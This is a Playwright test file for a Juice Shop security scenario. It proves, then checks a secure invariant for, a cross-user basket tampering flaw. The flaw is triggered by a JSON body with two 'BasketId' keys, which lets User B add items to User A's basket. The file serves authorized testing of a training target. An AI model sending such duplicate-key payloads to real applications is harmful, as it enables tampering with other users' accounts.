import { test, expect, type TestInfo } from '@playwright/test';
import { newAuthedApiContext } from '../../fixtures/sessions';
import { makeEphemeralTestUser } from '../../fixtures/users';
import { BasketApi, mutationResultBasketId, type BasketItemMutationResult } from '../../support/api/basket-api';

type ProductMutationCandidate = {
    id: number;
    payload: string;
    result: BasketItemMutationResult;
};

function buildTestRunKey(testInfo: TestInfo): string {
    return `${testInfo.workerIndex}-${testInfo.retry}-${Date.now()}`;
}

function buildCandidateProductIds(excludedProductIds: number[], maxProductId = 40): number[] {
    const excluded = new Set(excludedProductIds.filter((id) => Number.isFinite(id) && id > 0));
    return Array.from({ length: maxProductId }, (_, index) => index + 1).filter((productId) => !excluded.has(productId));
}

async function findWorkingProductMutation(basketApi: BasketApi, excludedProductIds: number[], buildPayload: (productId: number) => string): Promise<ProductMutationCandidate> {
    const attempts: Array<{ productId: number; status: number; responseSnippet: string }> = [];

    for (const productId of buildCandidateProductIds(excludedProductIds)) {
        const payload = buildPayload(productId);
        const result = await basketApi.postRawItemMutation(payload);

        attempts.push({
            productId,
            status: result.status,
            responseSnippet: result.text.slice(0, 200),
        });

        if (result.status >= 200 && result.status < 300) {
            return {
                id: productId,
                payload,
                result,
            };
        }
    }

    throw new Error(`Could not find a working product ID outside excluded IDs: ${excludedProductIds.join(', ')}. Attempts: ${JSON.stringify(attempts)}`);
}

test.describe('SCN-04: duplicate BasketId enables cross-user basket mutation', () => {
    test('evidence: a second BasketId lets User B add an item to User A basket', { tag: '@evidence-pass' }, async ({ baseURL }, testInfo) => {
        const runKey = buildTestRunKey(testInfo);
        // Use per-run users so basket state starts clean without introducing shared-user races under parallel execution.
        const userA = makeEphemeralTestUser('SCN04-EVIDENCE-A', `${runKey}-a`);
        const userB = makeEphemeralTestUser('SCN04-EVIDENCE-B', `${runKey}-b`);

        const { api: apiA, token: tokenA, basketId: basketIdA } = await newAuthedApiContext(baseURL!, userA);
        const { api: apiB, token: tokenB, basketId: basketIdB } = await newAuthedApiContext(baseURL!, userB);
        const basketApiA = new BasketApi(apiA, tokenA);
        const basketApiB = new BasketApi(apiB, tokenB);

        try {
            const setup = await test.step('capture each user basket state', async () => {
                const userABefore = await basketApiA.getSnapshotById(basketIdA, 'User A before exploit');
                const userBBefore = await basketApiB.getSnapshotById(basketIdB, 'User B before baseline add');

                expect(userABefore.basketId).not.toBe(userBBefore.basketId);

                return {
                    userABefore,
                    userBBefore,
                };
            });

            const baseline = await test.step('prove a normal basket-item POST works for user B', async () => {
                const baselineSelection = await findWorkingProductMutation(
                    basketApiB,
                    setup.userBBefore.products.map((product) => product.id),
                    (productId) => `{"ProductId":${productId},"BasketId":"${setup.userBBefore.basketId}","quantity":1}`,
                );
                const baselineProductId = baselineSelection.id;
                const baselineBody = baselineSelection.payload;
                const baselineResult = baselineSelection.result;
                const userBBaselineQtyBefore = setup.userBBefore.products.find((product) => product.id === baselineProductId)?.quantity ?? 0;

                expect(userBBaselineQtyBefore).toBe(0);
                console.log('User B selected dynamic baseline product ID:', baselineProductId);
                console.log('User B baseline payload:', baselineBody);
                console.log('User B baseline response body:', baselineResult.text);

                expect(baselineResult.status).toBe(200);
                expect(mutationResultBasketId(baselineResult.text)).toBe(setup.userBBefore.basketId);

                const userBAfterBaseline = await basketApiB.getSnapshotById(setup.userBBefore.basketId, 'User B after baseline add');
                const userBBaselineQtyAfter = userBAfterBaseline.products.find((product) => product.id === baselineProductId)?.quantity ?? 0;

                expect(userBBaselineQtyAfter).toBe(userBBaselineQtyBefore + 1);

                return { userBAfterBaseline };
            });

            await test.step('prove duplicate BasketId targets user A basket', async () => {
                const exploitSelection = await findWorkingProductMutation(
                    basketApiB,
                    [...setup.userABefore.products, ...baseline.userBAfterBaseline.products].map((product) => product.id),
                    (productId) => `{"ProductId":${productId},"BasketId":"${setup.userBBefore.basketId}","BasketId":"${setup.userABefore.basketId}","quantity":1}`,
                );
                const exploitProductId = exploitSelection.id;
                const exploitBody = exploitSelection.payload;
                const exploitResult = exploitSelection.result;
                const userAQtyBefore = setup.userABefore.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyBefore = baseline.userBAfterBaseline.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;

                expect(userAQtyBefore).toBe(0);
                expect(userBQtyBefore).toBe(0);

                console.log('User A basket ID:', setup.userABefore.basketId);
                console.log('User B basket ID:', setup.userBBefore.basketId);
                console.log('Duplicate BasketId exploit body:', exploitBody);
                console.log('Exploit response body:', exploitResult.text);

                expect(exploitBody).toContain(`"BasketId":"${setup.userBBefore.basketId}"`);
                expect(exploitBody).toContain(`"BasketId":"${setup.userABefore.basketId}"`);
                expect(exploitResult.status).toBe(200);
                expect(mutationResultBasketId(exploitResult.text)).toBe(setup.userABefore.basketId);

                const userAAfter = await basketApiA.getSnapshotById(setup.userABefore.basketId, 'User A after exploit');
                const userBAfter = await basketApiB.getSnapshotById(setup.userBBefore.basketId, 'User B after exploit');
                const userAQtyAfter = userAAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyAfter = userBAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;

                expect(userAQtyAfter).toBe(userAQtyBefore + 1);
                expect(userBQtyAfter).toBe(userBQtyBefore);
            });
        } finally {
            await apiA.dispose();
            await apiB.dispose();
        }
    });

    test('secure invariant: ambiguous BasketId must not let User B modify User A basket', { tag: '@secure-invariant-fail' }, async ({ baseURL }, testInfo) => {
        test.info().annotations.push({
            type: 'expected-on-vulnerable-target',
            description: 'Juice Shop is expected to violate this invariant until the basket write path is fixed.',
        });

        const runKey = buildTestRunKey(testInfo);
        const userA = makeEphemeralTestUser('SCN04-INVARIANT-A', `${runKey}-a`);
        const userB = makeEphemeralTestUser('SCN04-INVARIANT-B', `${runKey}-b`);

        const { api: apiA, token: tokenA, basketId: basketIdA } = await newAuthedApiContext(baseURL!, userA);
        const { api: apiB, token: tokenB, basketId: basketIdB } = await newAuthedApiContext(baseURL!, userB);
        const basketApiA = new BasketApi(apiA, tokenA);
        const basketApiB = new BasketApi(apiB, tokenB);

        try {
            const setup = await test.step('capture each user basket state', async () => {
                const userABefore = await basketApiA.getSnapshotById(basketIdA, 'User A before invariant check');
                const userBBefore = await basketApiB.getSnapshotById(basketIdB, 'User B before invariant check');

                expect(userABefore.basketId).not.toBe(userBBefore.basketId);

                return {
                    userABefore,
                    userBBefore,
                };
            });

            await test.step('submit ambiguous basket write as User B and assert secure handling', async () => {
                const exploitSelection = await findWorkingProductMutation(
                    basketApiB,
                    [...setup.userABefore.products, ...setup.userBBefore.products].map((product) => product.id),
                    (productId) => `{"ProductId":${productId},"BasketId":"${setup.userBBefore.basketId}","BasketId":"${setup.userABefore.basketId}","quantity":1}`,
                );
                const exploitProductId = exploitSelection.id;
                const exploitBody = exploitSelection.payload;
                const exploitResult = exploitSelection.result;
                const userAQtyBefore = setup.userABefore.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyBefore = setup.userBBefore.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;

                console.log('Secure invariant payload:', exploitBody);
                console.log('Secure invariant response body:', exploitResult.text);

                const userAAfter = await basketApiA.getSnapshotById(setup.userABefore.basketId, 'User A after invariant check');
                const userBAfter = await basketApiB.getSnapshotById(setup.userBBefore.basketId, 'User B after invariant check');
                const userAQtyAfter = userAAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const userBQtyAfter = userBAfter.products.find((product) => product.id === exploitProductId)?.quantity ?? 0;
                const isRejected = exploitResult.status >= 400 && exploitResult.status < 500;
                const isAccepted = exploitResult.status >= 200 && exploitResult.status < 300;
                const mutatedBasketId = mutationResultBasketId(exploitResult.text);

                expect.soft(userAQtyAfter, 'Ambiguous BasketId input must never modify User A basket.').toBe(userAQtyBefore);
                expect.soft(isRejected || isAccepted, 'Ambiguous basket writes must be rejected with 4xx or safely constrained to User B basket.').toBeTruthy();
                expect.soft(exploitResult.status, 'Server errors are not a secure way to handle ambiguous basket identifiers.').toBeLessThan(500);
                expect.soft(!isRejected || userBQtyAfter === userBQtyBefore, 'Rejected requests must not change User B basket either.').toBeTruthy();
                expect.soft(!isAccepted || mutatedBasketId === setup.userBBefore.basketId, 'If the server accepts ambiguous input, it must keep the write bound to User B basket.').toBeTruthy();
                expect.soft(!isAccepted || userBQtyAfter === userBQtyBefore + 1, 'Accepted ambiguous writes may only affect User B basket.').toBeTruthy();
            });
        } finally {
            await apiA.dispose();
            await apiB.dispose();
        }
    });
});
